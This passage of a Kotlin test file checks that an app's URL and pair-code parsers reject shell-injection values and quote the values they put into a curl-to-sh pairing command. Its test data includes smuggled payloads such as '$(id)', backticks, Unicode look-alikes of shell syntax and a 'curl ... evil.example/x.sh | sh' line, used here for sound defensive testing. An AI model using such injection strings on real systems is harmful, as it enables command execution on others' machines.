    fun aUnicodeHostIsAdoptedAsThePunycodeOfTheSameHost() {
        // What OkHttp has always resolved, and what the iPhone adopts for the
        // same QR (DemoData.verifyPairing): both clients take this board.
        val board = Board.parse("https://bücher.example/w/$TOKEN")
        assertEquals(Board("https://xn--bcher-kva.example", TOKEN), board)
        assertEquals(
            Board("https://xn--bcher-kva.example:8443", null),
            Board.parse("https://BÜCHER.Example:8443/"),
        )
        assertEquals("https://xn--80aai0dbebi.xn--p1ai", Board.origin("https://агстатус.рф"))
        // Saved in its punycode form, it reads back as itself; saved as typed
        // by a build that kept the raw text, it is repaired to the same.
        assertEquals(board, Board.restore(board!!.baseUrl, board.token))
        assertEquals(board, Board.restore("https://bücher.example", TOKEN))
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'" +
                " --url 'https://xn--bcher-kva.example'",
            PairCode("ABCD-EFGH", 900).command(board),
        )
    }

    @Test
    fun aUnicodeHostIsHeldToTheClassAfterIdnaAsWellAsBefore() {
        // Each is let past the as-typed check (non-ASCII) and comes out of
        // OkHttp's NFKC mapping as ASCII shell syntax, which it keeps in a host.
        val rejected = listOf(
            "https://a；b.example/w/$TOKEN",               // fullwidth semicolon -> a;b
            "https://a＄（id）.example/w/$TOKEN",  // fullwidth $( ) -> a$(id)
            "https://a＇b.example/w/$TOKEN",               // fullwidth apostrophe -> a'b
            "https://a｀id｀.example/w/$TOKEN",        // fullwidth grave -> a`id`
            "https://a｜b.example/w/$TOKEN",               // fullwidth vertical line -> a|b
            "https://a;b.example/w/$TOKEN",               // Greek question mark -> a;b
            // Mixed: the ASCII half is refused as typed, before IDNA is reached.
            "https://a＄(id).example/w/$TOKEN",
            // A fullwidth @ maps to `@`, which OkHttp refuses in a host outright.
            "https://x＠agstatus.online/w/$TOKEN",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
        rejected.forEach { assertNull("expected null for $it", Board.origin(it)) }
        // restore() holds a saved one to the same rule, through origin().
        assertNull(Board.restore("https://a；b.example", TOKEN))
    }

    @Test
    fun anUnderscoreIsNotShellSyntaxAndIsAccepted() {
        // The same board iOS accepts. Android reaches it over HTTPS only, and
        // that is network_security_config's doing, not the authority class.
        assertEquals(Board("http://dev_pc.local:3000", null), Board.parse("http://dev_pc.local:3000"))
        val board = Board.parse("https://my_host.example/w/$TOKEN")
        assertEquals(Board("https://my_host.example", TOKEN), board)
        assertEquals(board, Board.restore(board!!.baseUrl, board.token))
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'" +
                " --url 'https://my_host.example'",
            PairCode("ABCD-EFGH", 900).command(board),
        )
    }

    @Test
    fun rebuildsTheOriginRatherThanKeepingTheTextAsTyped() {
        val expected = Board("https://agstatus.online", TOKEN)

        assertEquals(expected, Board.parse("https://AgStatus.Online/w/$TOKEN"))
        assertEquals(expected, Board.parse("HTTPS://agstatus.online/w/$TOKEN"))
        // A default port is not a self-hosted server: no `--url` for it. An
        // empty port is the default one (RFC 3986), and OkHttp agrees.
        assertEquals(expected, Board.parse("https://agstatus.online:443/w/$TOKEN"))
        assertEquals(expected, Board.parse("https://agstatus.online:/w/$TOKEN"))
        assertTrue(Board.parse("https://agstatus.online:443/w/$TOKEN")!!.isDefaultServer)
        assertEquals(Board("http://board.example", null), Board.parse("http://board.example:80"))

        assertEquals(Board("https://board.example:8443", TOKEN), Board.parse("https://board.example:8443/w/$TOKEN"))
        assertEquals(Board("http://[::1]:3000", null), Board.parse("http://[::1]:3000"))
        assertEquals(Board("http://10.0.2.2:3000", null), Board.parse("http://10.0.2.2:3000/"))
    }

    @Test
    fun originIsTheSameRuleForATypedServer() {
        assertEquals("https://board.example:8443", Board.origin("https://Board.Example:8443/some/path"))
        assertEquals("https://agstatus.online", Board.origin("https://agstatus.online:443"))
        assertNull(Board.origin("https://user@board.example"))
        assertNull(Board.origin("https://x;\$(id);@board.example"))
        assertNull(Board.origin("ftp://board.example"))
        assertNull(Board.origin("board.example"))
        assertNull(Board.origin(""))
    }

    // MARK: - Board.restore (boards saved by earlier builds)

    @Test
    fun restoreRepairsAPoisonedOriginToTheHostItWasReachingAllAlong() {
        val expected = Board("https://agstatus.online", TOKEN)

        val repaired = Board.restore("https://x;\$(touch\${IFS}pwned1);@agstatus.online", TOKEN)
        assertEquals(expected, repaired)
        assertTrue(repaired!!.isDefaultServer)
        assertEquals(expected, Board.restore("https://x;touch pwned2;@agstatus.online", TOKEN))
        assertEquals(
            Board("https://board.example:8443", TOKEN),
            Board.restore("https://u:p@Board.Example:8443", TOKEN),
        )
        // The repaired board pairs with no `--url` at all, quoted or not.
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
            PairCode("ABCD-EFGH", 900).command(repaired),
        )
    }

    @Test
    fun restoreKeepsACleanBoardExactlyAsSaved() {
        val clean = listOf(
            Board("https://agstatus.online", TOKEN),
            Board("https://board.example:8443", TOKEN),
            Board("http://192.168.1.10:8080", null),
            Board("http://10.0.2.2:3000", null),
            Board("http://[::1]:3000", null),
        )

        clean.forEach { assertEquals(it, Board.restore(it.baseUrl, it.token)) }
    }

    @Test
    fun restoreDropsWhatItCannotRepair() {
        val unrepairable = listOf(
            "not a url",
            "ftp://agstatus.online",
            "https://",
            // The host itself is the payload: there is no cleaner host to keep.
            "https://x\$(id).example",
            "https://a;b.example",
        )

        unrepairable.forEach { assertNull("expected null for $it", Board.restore(it, TOKEN)) }
    }

    // MARK: - PairCode

    @Test
    fun pairCodeAcceptsTheServersShapeAndStoresItCanonical() {
        assertEquals("ABCD-EFGH", PairCode.normalize("ABCD-EFGH"))
        assertEquals("ABCD-EFGH", PairCode.normalize("abcd-efgh"))
        // Servers from before the display dash sent the eight bare.
        assertEquals("ABCD-EFGH", PairCode.normalize("ABCDEFGH"))
        assertEquals("2345-6789", PairCode.normalize("23456789"))
        assertEquals("WXYZ-PQRS", PairCode.normalize("wxyzPQRS"))

        val fromServer = PairCode.fromServer("abcdefgh", 900)
        assertEquals(PairCode("ABCD-EFGH", 900), fromServer)
    }

    @Test
    fun pairCodeRejectsShellSyntaxAndAnythingOffTheAlphabet() {
        val rejected = listOf(
            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
            "ABCD;EFGH",
            "AB\$(id)GH",
            "ABCD-\$(id)",
            "ABCD`id`",
            "ABCD EFGH",
            "ABCD-EFGH ",
            " ABCD-EFGH",
            "ABCD-EFGH\n",
            "ABCD\nEFGH",
            "ABCD-EFG#",
            "ABCD-EFGH#",
            "ABCD-EFG'",
            // Off the alphabet: I, L, O, 0 and 1 are never minted.
            "ABCD-1234",
            "ABCD-EFGI",
            "ABCD-EFGL",
            "ABCD-EFGO",
            "ABCD-EFG0",
            // Off the shape.
            "ABC-DEFGH",
            "ABCD--EFGH",
            "ABCD-EFGHJ",
            "ABCDEFG",
            "ABCD_EFGH",
            "",
            // Uppercases into the alphabet, but was never ASCII.
            "abcdefgſ",
            "ＡBCD-EFGH",
        )

        rejected.forEach {
            assertNull("expected null for $it", PairCode.normalize(it))
            assertNull("expected null for $it", PairCode.fromServer(it, 900))
        }
    }

    @Test
    fun aPairCodeCannotBeBuiltAroundAnUncheckedValue() {
        listOf("ABCD-EFGH; id", "abcd-efgh", "ABCDEFGH").forEach { raw ->
            try {
                PairCode(raw, 900)
                fail("expected PairCode($raw) to be refused")
            } catch (expected: IllegalArgumentException) {
                // The init block refuses anything but the canonical form.
            }
        }
    }

    @Test
    fun pairCommandQuotesEveryValueItInterpolates() {
        val code = PairCode.fromServer("ABCD-EFGH", 900)!!

        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- --code 'ABCD-EFGH'",
            code.command(Board("https://agstatus.online", TOKEN)),
        )
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
                "--code 'ABCD-EFGH' --url 'https://board.example:8443'",
            code.command(Board.parse("https://board.example:8443/w/$TOKEN")!!),
        )
        // The backstop: a baseUrl that never went through parse() — as every
        // saved board did before restore() — is still one shell word.
        assertEquals(
            "curl -fsSL https://agstatus.online/install.sh | sh -s -- " +
                "--code 'ABCD-EFGH' --url 'https://x;\$(id);@agstatus.online'",
            code.command(Board("https://x;\$(id);@agstatus.online", TOKEN)),
        )
    }

    @Test
    fun shellQuotingEscapesAnEmbeddedQuote() {
        assertEquals("'ABCD-EFGH'", shellQuoted("ABCD-EFGH"))
        assertEquals("'it'\\''s'", shellQuoted("it's"))
        assertEquals("''\\'''", shellQuoted("'"))
        assertEquals("'\$(id); `id` #'", shellQuoted("\$(id); `id` #"))
        assertEquals("''", shellQuoted(""))
    }

    private companion object {
        // Built rather than written out, matching the server tests: a literal
        // 32-character token has enough entropy to trip secret scanners.
        val TOKEN = "ags_" + "a".repeat(32)

        /** Per-board machine hashes: 32 lowercase hex, like the real ones. */
        val MACHINE_ID = "9f2c".padEnd(32, '0')
        val OTHER_ID = "7c2e".padEnd(32, '1')
        const val COMMAND_ID = "6c1f0a2b-3d4e-4f50-8a6b-7c8d9e0f1a2b"
        const val SESSION_ID = "5cef7152-ef68-481f-8a4f-463f66702bf9"

        /** The server captures' scenarios, one session each, `seed-<scenario>`. */
        val SCENARIOS = listOf(
            "none", "two", "ten", "thirty", "blocked", "two-blocked", "failed",
            "finished", "background", "hold", "minimal", "codex", "long",
        )
        val FIXTURES = listOf("sessions-all.json") + SCENARIOS.map { "sessions-$it.json" }
    }
}
